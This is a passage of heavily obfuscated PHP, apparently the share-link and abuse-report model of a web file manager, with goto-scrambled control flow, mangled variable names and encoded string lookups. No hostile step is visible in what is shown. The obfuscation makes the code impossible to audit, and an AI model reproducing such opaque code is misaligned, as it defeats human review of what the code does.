$D‘ù‡«ùÚ[2214]; goto DŠÃ†‘øá; bÙÚâÔ¡: } protected function shareAdd($aëÄòŒÔ™, $B®„È¡Ò©) { $cë×ÀäÀ‘ó =& $_SERVER[Æ]; $bÇÅä˜’­ˆ = $this->_addShareData($aëÄòŒÔ™, $B®„È¡Ò©); if (!empty($B®„È¡Ò©[$cë×ÀäÀ‘ó[2217]])) { $this->_shareAuthSet($bÇÅä˜’­ˆ, $B®„È¡Ò©[$cë×ÀäÀ‘ó[2217]]); } $this->shareEventAdd($aëÄòŒÔ™, $B®„È¡Ò©, $cë×ÀäÀ‘ó[1010]); return $bÇÅä˜’­ˆ; } private function shareEventAdd($c¯áÁöĞ—è, $c•„¡Ôçò, $añëÑ½æ‹ = "\141\x64\x64") { goto F÷‹ö„º‡¿; F÷‹ö„º‡¿: $aªË‰â÷â =& $_SERVER[Æ]; if ($añëÑ½æ‹ == $aªË‰â÷â[1010]) { if ($c•„¡Ôçò[$aªË‰â÷â[446]] == $aªË‰â÷â[83]) { Model($aªË‰â÷â[505])->eventShare($c¯áÁöĞ—è, $aªË‰â÷â[2218]); } if ($c•„¡Ôçò[$aªË‰â÷â[448]] == $aªË‰â÷â[83]) { Model($aªË‰â÷â[505])->eventShare($c¯áÁöĞ—è, $aªË‰â÷â[2219]); } return; } $D“¬Üëí = $this->getInfoByPath($c¯áÁöĞ—è); goto eÑ¾Ê–àõ½; b†¶­²¬îù: return; goto fÑİ…¡®Õí; aó”ÁÙÔ„: if ($D“¬Üëí[$aªË‰â÷â[448]] == $aªË‰â÷â[468] && $c•„¡Ôçò[$aªË‰â÷â[448]] == $aªË‰â÷â[83]) { $B®©º³îÌğ = $aªË‰â÷â[2219]; } if ($D“¬Üëí[$aªË‰â÷â[448]] == $aªË‰â÷â[83] && $c•„¡Ôçò[$aªË‰â÷â[448]] == $aªË‰â÷â[468]) { $B®©º³îÌğ = $aªË‰â÷â[2222]; } Model($aªË‰â÷â[505])->eventShare($c¯áÁöĞ—è, $B®©º³îÌğ); goto b†¶­²¬îù; eÑ¾Ê–àõ½: $B®©º³îÌğ = $aªË‰â÷â[2220]; if ($D“¬Üëí[$aªË‰â÷â[446]] == $aªË‰â÷â[468] && $c•„¡Ôçò[$aªË‰â÷â[446]] == $aªË‰â÷â[83]) { $B®©º³îÌğ = $aªË‰â÷â[2218]; } if ($D“¬Üëí[$aªË‰â÷â[446]] == $aªË‰â÷â[83] && $c•„¡Ôçò[$aªË‰â÷â[446]] == $aªË‰â÷â[468]) { $B®©º³îÌğ = $aªË‰â÷â[2221]; } goto aó”ÁÙÔ„; fÑİ…¡®Õí: } private function _addShareData($FæË³ÍáÍÎ, $bõÎ³¾…ƒÁ = array()) { goto eòäˆ†ºÔÜ; eòäˆ†ºÔÜ: $eØ‘ªä«Ø =& $_SERVER[Æ]; $f™İâí§¾ = array($eØ‘ªä«Ø[383] => $FæË³ÍáÍÎ, $eØ‘ªä«Ø[1425] => USER_ID); if ($FæË³ÍáÍÎ == 0) { $f™İâí§¾ = array($eØ‘ªä«Ø[2223] => $bõÎ³¾…ƒÁ[$eØ‘ªä«Ø[1018]], $eØ‘ªä«Ø[1425] => USER_ID); } goto e™Ò»…Êòâ; eÀÍ¥š×Œ: return $BĞŸòØ¡š‰; goto FõÈÏÜÉä; e™Ò»…Êòâ: if ($dïğ ³Î”Ø = $this->where($f™İâí§¾)->find()) { return $dïğ ³Î”Ø[$eØ‘ªä«Ø[441]]; } if ($FæË³ÍáÍÎ == 0) { $C‘¥Şá³¨¥ = array($eØ‘ªä«Ø[28] => get_path_this($bõÎ³¾…ƒÁ[$eØ‘ªä«Ø[75]])); } else { $C‘¥Şá³¨¥ = Model($eØ‘ªä«Ø[751])->sourceInfo($FæË³ÍáÍÎ); if (!$C‘¥Şá³¨¥) { return !1; } } if (!$bõÎ³¾…ƒÁ[$eØ‘ªä«Ø[1340]]) { $bõÎ³¾…ƒÁ[$eØ‘ªä«Ø[1340]] = $C‘¥Şá³¨¥[$eØ‘ªä«Ø[28]]; } goto eñ¸á·¼è“; eñ¸á·¼è“: $a²¦Å½Ïòâ = array($eØ‘ªä«Ø[1425] => USER_ID, $eØ‘ªä«Ø[383] => $FæË³ÍáÍÎ, $eØ‘ªä«Ø[1340] => $eØ‘ªä«Ø[33], $eØ‘ªä«Ø[446] => 0, $eØ‘ªä«Ø[448] => 0, $eØ‘ªä«Ø[1018] => $eØ‘ªä«Ø[33], $eØ‘ªä«Ø[295] => $eØ‘ªä«Ø[33], $eØ‘ªä«Ø[803] => $eØ‘ªä«Ø[33], $eØ‘ªä«Ø[2224] => 0, $eØ‘ªä«Ø[2225] => 0, $eØ‘ªä«Ø[701] => 0, $eØ‘ªä«Ø[2226] => $eØ‘ªä«Ø[33], $eØ‘ªä«Ø[443] => $eØ‘ªä«Ø[33]); $FµŠƒóƒÓš = explode($eØ‘ªä«Ø[47], $eØ‘ªä«Ø[2227]); foreach ($FµŠƒóƒÓš as $A¢ã¸™Ì£ì) { if (!isset($bõÎ³¾…ƒÁ[$A¢ã¸™Ì£ì])) { continue; } $a²¦Å½Ïòâ[$A¢ã¸™Ì£ì] = $bõÎ³¾…ƒÁ[$A¢ã¸™Ì£ì]; } goto aÊøõä§¯; aÊøõä§¯: $BĞŸòØ¡š‰ = $this->add($a²¦Å½Ïòâ); $Dù›ÌÜ«­é = array($eØ‘ªä«Ø[443] => short_id($BĞŸòØ¡š‰)); $this->where(array($eØ‘ªä«Ø[440] => $BĞŸòØ¡š‰))->save($Dù›ÌÜ«­é); goto eÀÍ¥š×Œ; FõÈÏÜÉä: } private function _shareAuthSet($AÓÜ¶ÍÚî, $EÅ¿ˆğ“Û—) { goto aŒÚöŞ˜Ñ; bî±ˆ¬Û•À: return $E¡ÎæİÑŠ¬->addAll($aå—öçã“, array(), !0); goto d×ˆÈ¦ŸÑ; eÚ·¤¾¡ö„: $E¡ÎæİÑŠ¬->where(array($D÷­’ãµƒ[441] => $AÓÜ¶ÍÚî))->delete(); $aå—öçã“ = array(); foreach ($EÅ¿ˆğ“Û— as $Eªİªä‹ñ¿) { $Bˆğ„±íÂ— = SourceModel::TYPE_USER; if ($Eªİªä‹ñ¿[$D÷­’ãµƒ[371]] == SourceModel::TYPE_GROUP) { $Bˆğ„±íÂ— = SourceModel::TYPE_GROUP; } $F™Öœ’¦ˆÜ = array($D÷­’ãµƒ[441] => $AÓÜ¶ÍÚî, $D÷­’ãµƒ[371] => $Bˆğ„±íÂ—, $D÷­’ãµƒ[456] => intval($Eªİªä‹ñ¿[$D÷­’ãµƒ[456]]), $D÷­’ãµƒ[2229] => 0, $D÷­’ãµƒ[2230] => -1); if ($Eªİªä‹ñ¿[$D÷­’ãµƒ[2229]]) { $F™Öœ’¦ˆÜ[$D÷­’ãµƒ[2229]] = $Eªİªä‹ñ¿[$D÷­’ãµƒ[2229]]; } else { if ($Eªİªä‹ñ¿[$D÷­’ãµƒ[2230]]) { $F™Öœ’¦ˆÜ[$D÷­’ãµƒ[2230]] = $Eªİªä‹ñ¿[$D÷­’ãµƒ[2230]]; } } $aå—öçã“[] = $F™Öœ’¦ˆÜ; } goto bî±ˆ¬Û•À; aŒÚöŞ˜Ñ: $D÷­’ãµƒ =& $_SERVER[Æ]; if (!is_array($EÅ¿ˆğ“Û—)) { return !1; } $E¡ÎæİÑŠ¬ = Model($D÷­’ãµƒ[2228]); goto eÚ·¤¾¡ö„; d×ˆÈ¦ŸÑ: } public function numViewAdd($d«‰¤¹˜Ó) { $EŒğ¬ÉÄä =& $_SERVER[Æ]; $BÓæÃ‡ùã¬ = array($EŒğ¬ÉÄä[440] => $d«‰¤¹˜Ó); $this->where($BÓæÃ‡ùã¬)->setAdd($EŒğ¬ÉÄä[2224]); } public function numDownloadAdd($E‹ëÆ¡ó©Ò) { $b¿­åªº‹Â =& $_SERVER[Æ]; $bÃ×‡¶Õ®Ø = array($b¿­åªº‹Â[440] => $E‹ëÆ¡ó©Ò); $this->where($bÃ×‡¶Õ®Ø)->setAdd($b¿­åªº‹Â[2225]); } protected function shareEdit($eÄ¦ƒîøî°, $bõä¾²¿˜Ê) { goto b‚³Œ´÷Ì; EÜÄ‘ñ†ò: foreach ($E†©‘Û¦‘ as $C…àä½µ”Õ) { if (!array_key_exists($C…àä½µ”Õ, $bõä¾²¿˜Ê)) { continue; } $e•¢‡”¥ÃÎ[$C…àä½µ”Õ] = $bõä¾²¿˜Ê[$C…àä½µ”Õ]; } $this->shareEventAdd($cª¢‚¿‚¿[$DÜ¯ñ±†Ô[369]], $bõä¾²¿˜Ê, $DÜ¯ñ±†Ô[2069]); $this->where(array($DÜ¯ñ±†Ô[440] => $eÄ¦ƒîøî°))->save($e•¢‡”¥ÃÎ); goto dª÷¾´öÂ©; Fğˆ¡†„£: $this->_checkLinkShare($bõä¾²¿˜Ê, $cª¢‚¿‚¿); $e•¢‡”¥ÃÎ = array(); $E†©‘Û¦‘ = explode($DÜ¯ñ±†Ô[47], $DÜ¯ñ±†Ô[2231]); goto EÜÄ‘ñ†ò; dª÷¾´öÂ©: if (isset($bõä¾²¿˜Ê[$DÜ¯ñ±†Ô[2217]])) { $this->_shareAuthSet($eÄ¦ƒîøî°, $bõä¾²¿˜Ê[$DÜ¯ñ±†Ô[2217]]); } return !0; goto Cİ¯–¨İ½Ú; b‚³Œ´÷Ì: $DÜ¯ñ±†Ô =& $_SERVER[Æ]; $cª¢‚¿‚¿ = $this->getInfo($eÄ¦ƒîøî°); if (!$cª¢‚¿‚¿) { return !1; } goto Fğˆ¡†„£; Cİ¯–¨İ½Ú: } private function _checkLinkShare($EÓÕĞî¯ØÅ, $dˆñôŠç¿ß) { goto E¯ŸÜæ÷‰; b‡œ¦©ß¯ê: if ($dˆñôŠç¿ß[$E†´ÈÇ‘÷Œ[391]][$E†´ÈÇ‘÷Œ[29]] != $E†´ÈÇ‘÷Œ[167]) { $Cí¾½Œôå = $this->_folderReport($d¦³·Æ´½ù); if (!$Cí¾½Œôå) { return; } show_json(LNG($E†´ÈÇ‘÷Œ[2232]) . $E†´ÈÇ‘÷Œ[2233] . $Cí¾½Œôå, !1); } $aØŒ‹ÂŒ˜é = Model($E†´ÈÇ‘÷Œ[751])->fileInfoGet($dˆñôŠç¿ß[$E†´ÈÇ‘÷Œ[391]][$E†´ÈÇ‘÷Œ[369]]); if (!$aØŒ‹ÂŒ˜é) { return; } goto F‘îµÁ·„§; E¯ŸÜæ÷‰: $E†´ÈÇ‘÷Œ =& $_SERVER[Æ]; if ($EÓÕĞî¯ØÅ[$E†´ÈÇ‘÷Œ[446]] != $E†´ÈÇ‘÷Œ[83]) { return; } $d¦³·Æ´½ù = $dˆñôŠç¿ß[$E†´ÈÇ‘÷Œ[391]][$E†´ÈÇ‘÷Œ[369]]; goto b‡œ¦©ß¯ê; F‘îµÁ·„§: $A„¯´óª¤³ = $this->shareFileMeta($aØŒ‹ÂŒ˜é[$E†´ÈÇ‘÷Œ[419]]); if (isset($A„¯´óª¤³[$E†´ÈÇ‘÷Œ[359]]) && $A„¯´óª¤³[$E†´ÈÇ‘÷Œ[359]] == $E†´ÈÇ‘÷Œ[83]) { show_json(LNG($E†´ÈÇ‘÷Œ[2234]), !1); } goto B•Â¥òÎğ¸; B•Â¥òÎğ¸: } private function _folderReport($aÀ¿ì†‘Š˜) { goto D½©œÃ‡·İ; eŒßùòÉô³: $e¶ÈøÎêÁ— = substr($f­§ØÌÀÔÆ[$dåØâôÌ±[459]], strpos($f­§ØÌÀÔÆ[$dåØâôÌ±[459]], $B Øî¼Æº)); $AÄ­ÁÆô¸ = array($dåØâôÌ±[369] => array($dåØâôÌ±[7], trim($e¶ÈøÎêÁ—, $dåØâôÌ±[47]))); $F†™¡„³£ = Model($dåØâôÌ±[751])->where($AÄ­ÁÆô¸)->field($dåØâôÌ±[28])->select(); goto D”²ï¸í×ƒ; D½©œÃ‡·İ: $dåØâôÌ± =& $_SERVER[Æ]; $AÄ­ÁÆô¸ = array($dåØâôÌ±[419] => array($dåØâôÌ±[927], 0), $dåØâôÌ±[687] => 3); $EáÉèæØé¬ = Model($dåØâôÌ±[2235])->where($AÄ­ÁÆô¸)->field($dåØâôÌ±[419])->select(); goto F•Ğê¬†ƒÅ; FéÃÊ³‚±Ö: $AÄ­ÁÆô¸ = array($dåØâôÌ±[419] => array($dåØâôÌ±[7], $EáÉèæØé¬), $dåØâôÌ±[459] => array($dåØâôÌ±[750], "\x25{$B Øî¼Æº}\45"), $dåØâôÌ±[397] => 0); $f­§ØÌÀÔÆ = Model($dåØâôÌ±[751])->where($AÄ­ÁÆô¸)->field($dåØâôÌ±[2236])->find(); if (!$f­§ØÌÀÔÆ) { return !1; } goto eŒßùòÉô³; F•Ğê¬†ƒÅ: if (!$EáÉèæØé¬) { return !1; } $EáÉèæØé¬ = array_to_keyvalue($EáÉèæØé¬, $dåØâôÌ±[33], $dåØâôÌ±[419]); $B Øî¼Æº = $dåØâôÌ±[47] . $aÀ¿ì†‘Š˜ . $dåØâôÌ±[47]; goto FéÃÊ³‚±Ö; D”²ï¸í×ƒ: $Aõá”ÉÅæ¢ = array_to_keyvalue($F†™¡„³£, $dåØâôÌ±[33], $dåØâôÌ±[28]); $Aõá”ÉÅæ¢[] = $f­§ØÌÀÔÆ[$dåØâôÌ±[28]]; return implode($dåØâôÌ±[8], $Aõá”ÉÅæ¢); goto E­¯áºéÜÕ; E­¯áºéÜÕ: } protected function remove($E²¾á½Ö†) { goto aì‰Â½š†©; aì‰Â½š†©: $A½Ø¼ÂÇƒ =& $_SERVER[Æ]; if (is_array($E²¾á½Ö†)) { $E²¾á½Ö† = array($A½Ø¼ÂÇƒ[7], $E²¾á½Ö†); } $FÇèé“”Õ— = array($A½Ø¼ÂÇƒ[441] => $E²¾á½Ö†); goto F¼‚ö…Å½É; eÕÁ„Á¼: for ($CÆ˜Æ½Šáº = 0; $CÆ˜Æ½Šáº < count($fñÔ­‹ÔÀ); $CÆ˜Æ½Šáº++) { $cÜõ†œ‡¹ = $this->getInfo($fñÔ­‹ÔÀ[$CÆ˜Æ½Šáº]); if ($cÜõ†œ‡¹[$A½Ø¼ÂÇƒ[448]] == $A½Ø¼ÂÇƒ[83]) { Model($A½Ø¼ÂÇƒ[505])->eventShare($cÜõ†œ‡¹[$A½Ø¼ÂÇƒ[369]], $A½Ø¼ÂÇƒ[2222]); } if ($cÜõ†œ‡¹[$A½Ø¼ÂÇƒ[446]] == $A½Ø¼ÂÇƒ[83]) { Model($A½Ø¼ÂÇƒ[505])->eventShare($cÜõ†œ‡¹[$A½Ø¼ÂÇƒ[369]], $A½Ø¼ÂÇƒ[2221]); } } return $cÃ›¨¦—¹Š; goto Eºå­Šø¯; F¼‚ö…Å½É: $cÃ›¨¦—¹Š = $this->where($FÇèé“”Õ—)->delete(); if ($cÃ›¨¦—¹Š) { Model($A½Ø¼ÂÇƒ[537])->where(array($A½Ø¼ÂÇƒ[441] => $E²¾á½Ö†))->delete(); } $fñÔ­‹ÔÀ = is_array($E²¾á½Ö†) ? $E²¾á½Ö†[1] : array($E²¾á½Ö†); goto eÕÁ„Á¼; Eºå­Šø¯: } protected function removeBySource($c—±ÍåñË×) { goto fà›ëŸ½´ğ; e–·ƒÀİ: $fÒ‚Èâ‘‡ = array_to_keyvalue($fÒ‚Èâ‘‡, $bÊñ½â‚¯Ò[33], $bÊñ½â‚¯Ò[441]); if (!$fÒ‚Èâ‘‡) { return; } $B²ŞĞÓ¯› = array($bÊñ½â‚¯Ò[440] => array($bÊñ½â‚¯Ò[384], $fÒ‚Èâ‘‡)); goto C…¼§ã†Û; C…¼§ã†Û: $this->where($B²ŞĞÓ¯›)->delete(); Model($bÊñ½â‚¯Ò[537])->where($B²ŞĞÓ¯›)->delete(); goto F‚ùÉÄ‰¿; fà›ëŸ½´ğ: $bÊñ½â‚¯Ò =& $_SERVER[Æ]; $B²ŞĞÓ¯› = array($bÊñ½â‚¯Ò[383] => array($bÊñ½â‚¯Ò[384], $c—±ÍåñË×)); $fÒ‚Èâ‘‡ = $this->field($bÊñ½â‚¯Ò[441])->where($B²ŞĞÓ¯›)->select(); goto e–·ƒÀİ; F‚ùÉÄ‰¿: } public function listAll($EóŠÌ›²†‰) { goto E–ÖÕ·âÑî; E–ÖÕ·âÑî: $fÕ²àä³ª =& $_SERVER[Æ]; $a‚İª‘Ğ­£ = array(); if ($EóŠÌ›²†‰[$fÕ²àä³ª[1434]]) { $a‚İª‘Ğ­£[$fÕ²àä³ª[1434]] = $EóŠÌ›²†‰[$fÕ²àä³ª[1434]]; } goto A¼¥‚¤¾í; F²…—·á´Â: $FÚ¨°Ğ§Æƒ = $this->_makeOrder()->where($a‚İª‘Ğ­£)->selectPage(20); if (empty($FÚ¨°Ğ§Æƒ[$fÕ²àä³ª[354]])) { return array(); } $this->_listDataApply($FÚ¨°Ğ§Æƒ[$fÕ²àä³ª[354]]); goto e°ğ×ÛØè°; A¼¥‚¤¾í: if ($EóŠÌ›²†‰[$fÕ²àä³ª[700]]) { $A¯†ø©Ğ­á = $EóŠÌ›²†‰[$fÕ²àä³ª[701]] ? $EóŠÌ›²†‰[$fÕ²àä³ª[701]] : strtotime(date($fÕ²àä³ª[2237])); $a‚İª‘Ğ­£[$fÕ²àä³ª[187]] = array($fÕ²àä³ª[321], array($EóŠÌ›²†‰[$fÕ²àä³ª[700]], $A¯†ø©Ğ­á)); } if ($EóŠÌ›²†‰[$fÕ²àä³ª[29]]) { $a‚İª‘Ğ­£[$EóŠÌ›²†‰[$fÕ²àä³ª[29]]] = 1; } else { $a‚İª‘Ğ­£[] = array($fÕ²àä³ª[446] => array($fÕ²àä³ª[927], 0), $fÕ²àä³ª[448] => array($fÕ²àä³ª[927], 0), $fÕ²àä³ª[2212] => $fÕ²àä³ª[2181]); } if ($EóŠÌ›²†‰[$fÕ²àä³ª[2177]]) { $a‚İª‘Ğ­£[] = array($fÕ²àä³ª[443] => $EóŠÌ›²†‰[$fÕ²àä³ª[2177]], $fÕ²àä³ª[1340] => array($fÕ²àä³ª[750], "\45{$EóŠÌ›²†‰[$fÕ²àä³ª[2177]]}\x25"), $fÕ²àä³ª[2212] => $fÕ²àä³ª[2181]); } goto F²…—·á´Â; e°ğ×ÛØè°: return $FÚ¨°Ğ§Æƒ; goto bŸéöãÈ¯; bŸéöãÈ¯: } public function listDataApply($B‘Í§”´ëª) { $this->_listDataApply($B‘Í§”´ëª); return $B‘Í§”´ëª; } private function _listDataApply(&$fŠêÅéğñ) { $c¼âŒ­¾•ó =& $_SERVER[Æ]; $F§¢¿‰çŞ´ = array_to_keyvalue($fŠêÅéğñ, $c¼âŒ­¾•ó[33], $c¼âŒ­¾•ó[1434]); $Bíó»ÉÁª = Model($c¼âŒ­¾•ó[477])->userListInfo(array_unique($F§¢¿‰çŞ´)); $aâÓŠšÃ»î = array_to_keyvalue($fŠêÅéğñ, $c¼âŒ­¾•ó[33], $c¼âŒ­¾•ó[369]); $A·Ñå±ñé‹ = Model($c¼âŒ­¾•ó[751])->sourceListInfo($aâÓŠšÃ»î, !0); foreach ($fŠêÅéğñ as &$Dá”¾°êæ) { $DİÇŸÇ²¤± = $Dá”¾°êæ[$c¼âŒ­¾•ó[1434]]; $Dá”¾°êæ[$c¼âŒ­¾•ó[2238]] = $Bíó»ÉÁª[$DİÇŸÇ²¤±] ? $Bíó»ÉÁª[$DİÇŸÇ²¤±] : !1; $AŒ”İÉà› = $Dá”¾°êæ[$c¼âŒ­¾•ó[369]]; $Dá”¾°êæ[$c¼âŒ­¾•ó[391]] = $A·Ñå±ñé‹[$AŒ”İÉà›] ? $A·Ñå±ñé‹[$AŒ”İÉà›] : !1; } } private function _makeOrder($DôªËìš› = '') { goto C…ª·¾˜±; C…ª·¾˜±: $FğÄÆá¡Çİ =& $_SERVER[Æ]; $e«†Óéé = array($FğÄÆá¡Çİ[187], $FğÄÆá¡Çİ[701], $FğÄÆá¡Çİ[2224], $FğÄÆá¡Çİ[2225]); $c¾Œ¦§‘’ˆ = array($FğÄÆá¡Çİ[402] => $FğÄÆá¡Çİ[403], $FğÄÆá¡Çİ[404] => $FğÄÆá¡Çİ[405]); goto E®ÜÒ™Æâî; E®ÜÒ™Æâî: $a‹“•¼‚‡Ø = Input::get($FğÄÆá¡Çİ[407], $FğÄÆá¡Çİ[7], $FğÄÆá¡Çİ[389], $e«†Óéé); $EÕ‚³º¥ñ = Input::get($FğÄÆá¡Çİ[408], $FğÄÆá¡Çİ[7], $FğÄÆá¡Çİ[2239], array($FğÄÆá¡Çİ[2176], $FğÄÆá¡Çİ[404])); $EÕ‚³º¥ñ = $c¾Œ¦§‘’ˆ[$EÕ‚³º¥ñ]; goto cÉ—Í•‡ôÍ; cÉ—Í•‡ôÍ: $DôªËìš› = $DôªËìš› . "{$a‹“•¼‚‡Ø}\40{$EÕ‚³º¥ñ}"; return $this->order($DôªËìš›); goto c§ÛŠ¯†º–; c§ÛŠ¯†º–: } public function reportAdd($A‰„µåøá») { $AàÜÑ²ğµ =& $_SERVER[Æ]; $e¥ïÁä›°Ï = array($AàÜÑ²ğµ[441] => $A‰„µåøá»[$AàÜÑ²ğµ[441]], $AàÜÑ²ğµ[1434] => USER_ID); if (Model($AàÜÑ²ğµ[2235])->where($e¥ïÁä›°Ï)->find()) { return !1; } $BŒÛ‹Úâ£¢ = array($AàÜÑ²ğµ[441] => $A‰„µåøá»[$AàÜÑ²ğµ[441]], $AàÜÑ²ğµ[1340] => $A‰„µåøá»[$AàÜÑ²ğµ[1340]], $AàÜÑ²ğµ[369] => $A‰„µåøá»[$AàÜÑ²ğµ[369]], $AàÜÑ²ğµ[419] => $A‰„µåøá»[$AàÜÑ²ğµ[419]], $AàÜÑ²ğµ[1434] => USER_ID, $AàÜÑ²ğµ[29] => $A‰„µåøá»[$AàÜÑ²ğµ[29]], $AàÜÑ²ğµ[405] => $A‰„µåøá»[$AàÜÑ²ğµ[405]]); return Model($AàÜÑ²ğµ[2235])->add($BŒÛ‹Úâ£¢); } public function reportList($E“ğ…Ù“Ö) { goto BÔôÉÀ““»; B‡¬ÂˆŠè: $Aæ‹´‚ö“­ = array($f’”ğÛÂéØ[402] => $f’”ğÛÂéØ[403], $f’”ğÛÂéØ[404] => $f’”ğÛÂéØ[405]); $f×‡Á“…ŒÔ = $f’”ğÛÂéØ[2243] . $Aæ‹´‚ö“­[$cÓ˜Ù¹ ÕÀ]; $f§¡¢ã›İÒ = Model($f’”ğÛÂéØ[2235])->where($a·‰ïÄˆ’È)->order($f×‡Á“…ŒÔ)->selectPage(20); goto E™Ë¥çÉ¯î; E™Ë¥çÉ¯î: if (empty($f§¡¢ã›İÒ[$f’”ğÛÂéØ[354]])) { return array(); } $this->_listDataApply($f§¡¢ã›İÒ[$f’”ğÛÂéØ[354]]); return $f§¡¢ã›İÒ; goto B¿µÍ‡ê; BÔôÉÀ““»: $f’”ğÛÂéØ =& $_SERVER[Æ]; $a·‰ïÄˆ’È = array(); if ($E“ğ…Ù“Ö[$f’”ğÛÂéØ[700]]) { $eƒ¤ÒíÓ¸Ä = $E“ğ…Ù“Ö[$f’”ğÛÂéØ[701]] ? $E“ğ…Ù“Ö[$f’”ğÛÂéØ[701]] : strtotime(date($f’”ğÛÂéØ[2237])); $a·‰ïÄˆ’È[$f’”ğÛÂéØ[187]] = array($f’”ğÛÂéØ[321], array($E“ğ…Ù“Ö[$f’”ğÛÂéØ[700]], $eƒ¤ÒíÓ¸Ä)); } goto e­¸Ğ´ğÔ; e­¸Ğ´ğÔ: if (isset($E“ğ…Ù“Ö[$f’”ğÛÂéØ[29]]) && in_array($E“ğ…Ù“Ö[$f’”ğÛÂéØ[29]], array($f’”ğÛÂéØ[83], $f’”ğÛÂéØ[2240], $f’”ğÛÂéØ[2241], $f’”ğÛÂéØ[2242], $f’”ğÛÂéØ[1917]))) { $a·‰ïÄˆ’È[$f’”ğÛÂéØ[29]] = $E“ğ…Ù“Ö[$f’”ğÛÂéØ[29]]; } if (isset($E“ğ…Ù“Ö[$f’”ğÛÂéØ[687]]) && in_array($E“ğ…Ù“Ö[$f’”ğÛÂéØ[687]], array($f’”ğÛÂéØ[468], $f’”ğÛÂéØ[83], $f’”ğÛÂéØ[2240], $f’”ğÛÂéØ[2241]))) { $a·‰ïÄˆ’È[$f’”ğÛÂéØ[687]] = $E“ğ…Ù“Ö[$f’”ğÛÂéØ[687]]; } $cÓ˜Ù¹ ÕÀ = Input::get($f’”ğÛÂéØ[408], $f’”ğÛÂéØ[7], $f’”ğÛÂéØ[2239], array($f’”ğÛÂéØ[2176], $f’”ğÛÂéØ[404])); goto B‡¬ÂˆŠè; B¿µÍ‡ê: } public function reportStatus($aÏæëö©ë©) { goto E®„†µî†ê; E®„†µî†ê: $AÊ‘Ï“í‚ =& $_SERVER[Æ]; $CùŒÄï»šô = array($AÊ‘Ï“í‚[367] => $aÏæëö©ë©[$AÊ‘Ï“í‚[367]]); $eæ”á®ÏÃ  = Model($AÊ‘Ï“í‚[2235])->where($CùŒÄï»šô)->field($AÊ‘Ï“í‚[2244])->find(); goto Eª¨´·Ú™è; Eª¨´·Ú™è: if (!$eæ”á®ÏÃ ) { return !1; } $c‘‹¼Ä“¡¦ = array($AÊ‘Ï“í‚[687] => $aÏæëö©ë©[$AÊ‘Ï“í‚[687]]); if ($aÏæëö©ë©[$AÊ‘Ï“í‚[687]] == $AÊ‘Ï“í‚[2241] && $eæ”á®ÏÃ [$AÊ‘Ï“í‚[687]] == $AÊ‘Ï“í‚[2241]) { $c‘‹¼Ä“¡¦[$AÊ‘Ï“í‚[687]] = 0; } goto E×µÕ³ªà¢; f¬ã–ï‰Ãí: return $fÆßì¦ß–™; goto eÖŒøğËä; E×µÕ³ªà¢: $fÆßì¦ß–™ = Model($AÊ‘Ï“í‚[2235])->where($CùŒÄï»šô)->save($c‘‹¼Ä“¡¦); if ($aÏæëö©ë©[$AÊ‘Ï“í‚[687]] == $AÊ‘Ï“í‚[2240]) { if ($eæ”á®ÏÃ [$AÊ‘Ï“í‚[419]] != $AÊ‘Ï“í‚[468] && $this->shareFileMeta($eæ”á®ÏÃ [$AÊ‘Ï“í‚[419]])) { $this->shareFileMeta($eæ”á®ÏÃ [$AÊ‘Ï“í‚[419]], 0); } $this->remove($eæ”á®ÏÃ [$AÊ‘Ï“í‚[441]]); return !0; } if ($fÆßì¦ß–™ && $aÏæëö©ë©[$AÊ‘Ï“í‚[687]] == $AÊ‘Ï“í‚[2241]) { $eøèœéñ‡ = $c‘‹¼Ä“¡¦[$AÊ‘Ï“í‚[687]] == $AÊ‘Ï“í‚[2241] ? 1 : 0; $this->shareFileMeta($eæ”á®ÏÃ [$AÊ‘Ï“í‚[419]], $eøèœéñ‡); $this->removeByFile($eæ”á®ÏÃ [$AÊ‘Ï“í‚[419]]); } goto f¬ã–ï‰Ãí; eÖŒøğËä: } private function removeByFile($Cí™œ‘§ê) { goto dŒ‰Ğ¿Ş¦; a½×Û©‡‰: $c«Ñôø•Œ = array_to_keyvalue($f¾ÜøÜ¯¼Œ, $b…‰ÚØœ—œ[33], $b…‰ÚØœ—œ[441]); $this->remove($c«Ñôø•Œ); goto dÛÖ×ƒ†; föŒ—ĞÆªã: $aºõ’ÛÈÀğ = array($b…‰ÚØœ—œ[369] => array($b…‰ÚØœ—œ[7], $a¿í¬°Âì), $b…‰ÚØœ—œ[446] => 1); $f¾ÜøÜ¯¼Œ = Model($b…‰ÚØœ—œ[2078])->where($aºõ’ÛÈÀğ)->field($b…‰ÚØœ—œ[441])->select(); if (empty($f¾ÜøÜ¯¼Œ)) { return; } goto a½×Û©‡‰; dŒ‰Ğ¿Ş¦: $b…‰ÚØœ—œ =& $_SERVER[Æ]; $f¾ÜøÜ¯¼Œ = Model($b…‰ÚØœ—œ[751])->where(array($b…‰ÚØœ—œ[419] => $Cí™œ‘§ê))->field($b…‰ÚØœ—œ[369])->select(); $a¿í¬°Âì = array_to_keyvalue($f¾ÜøÜ¯¼Œ, $b…‰ÚØœ—œ[33], $b…‰ÚØœ—œ[369]); goto föŒ—ĞÆªã; dÛÖ×ƒ†: } private function shareFileMeta($DÇƒƒŒØ, $eªÅèëîá = null) { $d÷×»¦í¼ =& $_SERVER[Æ]; $Cç¦Ğ¥¾ä = array($d÷×»¦í¼[419] => $DÇƒƒŒØ, $d÷×»¦í¼[89] => $d÷×»¦í¼[2245]); if (is_null($eªÅèëîá)) { return Model($d÷×»¦í¼[2246])->where($Cç¦Ğ¥¾ä)->find(); } $Cç¦Ğ¥¾ä[$d÷×»¦í¼[359]] = $eªÅèëîá; Model($d÷×»¦í¼[2246])->add($Cç¦Ğ¥¾ä, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\162\143\145\137\x61\x75\x74\x68"; public function getAuth($Aºø¦ì¬òˆ) { goto aÓ³ó‰Ëäª; aÓ³ó‰Ëäª: $BÕßŒ‰˜„ =& $_SERVER[Æ]; $dçëŠ”íàó = $BÕßŒ‰˜„[2247]; $Dóš »Š¾Ë = array($BÕßŒ‰˜„[369] => $Aºø¦ì¬òˆ); goto c§Õñš–İ; CÃ×ïµÛ’–: return $DøÎÙé±Œ–; goto fÄ›ÕŠÅ‹; c§Õñš–İ: $DŒÎİñœĞõ = $this->field($dçëŠ”íàó)->order($BÕßŒ‰˜„[367])->where($Dóš »Š¾Ë)->select(); $DøÎÙé±Œ– = array(); foreach ($DŒÎİñœĞõ as $aŠæ®ƒõé) { if (Model($BÕßŒ‰˜„[2248])->listData($aŠæ®ƒõé[$BÕßŒ‰˜„[2229]])) { $DøÎÙé±Œ–[] = $aŠæ®ƒõé; } } goto 